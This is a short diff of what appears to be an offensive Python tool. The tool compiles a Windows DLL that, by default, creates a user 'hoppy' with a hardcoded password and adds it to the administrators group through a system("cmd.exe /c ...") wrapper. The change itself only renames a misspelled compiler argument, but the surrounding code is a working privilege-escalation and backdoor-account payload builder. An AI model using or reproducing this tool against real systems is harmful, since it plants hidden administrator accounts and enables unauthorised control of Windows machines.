@@ -28,7 +28,7 @@ parser.add_argument('--username','-u',default="hoppy",help="Your username")
 parser.add_argument('--password','-p',default='H0pBreWedW1thl0v3',help="Your password matching the rules")
 parser.add_argument('--group','-g',default='administrators',help="The group, tips for FR it's Administrateur")
 parser.add_argument('--wrapper','-w',default='system("cmd.exe /c INJECT_HERE");',help="A command wrapper")
-parser.add_argument('--compliator','-c',default='x86_64-w64-mingw32-gcc',help="A C compilator : 'i686-w64-mingw32-gcc -lnetapi32' is an option")
+parser.add_argument('--compiler','-c',default='x86_64-w64-mingw32-gcc',help="A C compiler : 'i686-w64-mingw32-gcc -lnetapi32' is an option")
 parser.add_argument('--output','-o',default='hoppy.dll', help='path and name of your dll')
 parser.add_argument('--debug',action='store_true',default=False,help='print a lot of useless things')
 
@@ -68,7 +68,7 @@ with open(template) as f:
     f = open(temp_source.name, "a")
     f.write(payload)
     f.close()
-    compiltation_string="%s %s -shared -o %s"%(args.compliator,temp_source.name,output)
+    compiltation_string="%s %s -shared -o %s"%(args.compiler,temp_source.name,output)
     if(args.debug):
         print(compiltation_string)
     os.system(compiltation_string)
